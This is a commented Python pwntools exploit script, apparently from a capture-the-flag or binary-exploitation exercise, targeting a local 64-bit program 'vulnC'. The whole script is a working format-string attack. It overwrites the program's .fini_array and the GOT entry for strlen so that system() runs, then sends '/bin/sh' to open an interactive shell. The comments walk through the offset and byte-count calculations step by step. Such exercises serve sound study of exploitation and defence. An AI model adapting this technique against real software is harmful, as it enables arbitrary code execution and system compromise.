import pwn
import struct

# vulnC is a 64-bit dynamically linked executable
# It has NX enabled. ASLR is turned on

# This exploit involves overwriting both the got entry of strlen and the .fini_arry with printf format string exploit
# We overwrite .fini_array with the address of the start of a target function which contains a fgets and a strlen
# We overwrite the got entry for strlen with the address of system()
# On the pass through the target function, strlen's parameter is our input, we feed it "/bin/sh"
# As a result, system() is called with /bin/sh as its parameter

# This exploit is very similar to nightmare>tw16_greeting.
# The key difference is that this is a 64-bit executable, and therefore, our target addresses contain null bytes

# In ELF executables or shared object files:
# .fini section holds executable instructions that contribute to the process termination code. That is, when a prrogram exits normally, the system arranges to execute the code in this section
# .init section holds executable instructions that contribute to the process initialization code. When a program starts, the system executes the code in this section before the main  entry point

# .fini_array is optional, and sort of a fancier version of .fini

target = pwn.process('./vulnC')
#pwn.gdb.attach(target, gdbscript="b *0x0000000000401359") # 0x0000000000401359 is address right after printf


# printf stores the start of our input at the 6th 8-byte offset
# However, because they contain null bytes, we will need to send our addresses at the end of our payload
# The buffer we are reading into is 100 bytes long; So, we want the 92 -> 100 bytes to be our address.
# However, the 92nd offset would not be 8-byte aligned, so we want the 88th offset instead
# So, 6 (original input offset) + 11 (11 extra 8-byte chunks) = 17 = our new offset
# Sending the following payload allows us to verify our math:
# %17$paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddd


# Goals:
# 1) Overwrite address of .fini_array with an address in vuln_function
# 2) Overwrite got address of strlen with plt address of system

# .fini_array addr:
# Can find this by running 'info file' in gdb or:
# objdump -D vulnC | grep .fini_array
# 00000000004031c0 <__do_global_dtors_aux_fini_array_entry>:
fini_arr_addr_0 = struct.pack("<Q", 0x00000000004031c0)
fini_arr_addr_1 = struct.pack("<Q", 0x00000000004031c0 + 1)

# vuln_function addr: 0x0000000000401211 <-- Address at start of vuln_func

# strlen got:
# objdump -R vulnC | grep strlen
# 00000000004033c8
strlen_got_0 = struct.pack("<Q", 0x00000000004033c8)
strlen_got_1 = struct.pack("<Q", 0x00000000004033c8 + 1)

# system plt:
# objdump -D vulnC | grep system
# 00000000004010d0


# %14$n is the 64th -> 71st byte of our input
# %15$n is the 72nd -> 79th byte of our input
# %16$n is the 80th -> 87th byte of our input
# %17$n is the 88th -> 95th byte of our input
enum_fmt_string = b'%14$n' + b'%15$n' + b'%16$n' + b'%17$n'
target_addrs = fini_arr_addr_0 + fini_arr_addr_1 + strlen_got_0 + strlen_got_1

# We have four 8 byte addresses, which we want to have in the 64th, 72nd, 80th and 88th positions in our payload
# Front-pad the payload with a's, so that the addresses start at the 64th byte
enum_payload = (b'a' * (64 - len(enum_fmt_string))) + enum_fmt_string + target_addrs

# After sending our enumeration payload, we find that we have 0x2c2c in the got address of strlen and the address of .fini_array. Good!

# The bottom byte of .fini_array needs to be 0x11 
# 0x11 < 0x2c, so will write 0x111 instead
# 0x111 - 0x2c = 229 <-- We find that the modifications to our final payload have decreased the default value by 19 (229 + 19 = 248)
fmt_string = b'%248x' + b'%14$n'

# The bottom byte of strlen got needs to be 0xd0
# 0x1d0 - 0x111 = 191
fmt_string += b'%191x' + b'%16$n'

# The top two bytes of strlen got need to be 0x4010
# 0x4010 - 0x1d0 = 15936
fmt_string += b'%15936x' + b'%17$n'

# The top two bytes of .fini_array need to be 0x4012
# 0x4012 - 0x4010 = 2
fmt_string += b'aa' + b'%15$n'

final_payload = (b'a' * (64 - len(fmt_string))) + fmt_string + target_addrs

# After sending this payload, we find the desired addrs in the target locations. All thats left to do now is send "/bin/sh"

target.sendline(final_payload)
target.recvuntil(b'me a word:\n')
target.sendline(b'/bin/sh\0')

target.interactive()

# Wohooo! We have popped a shell
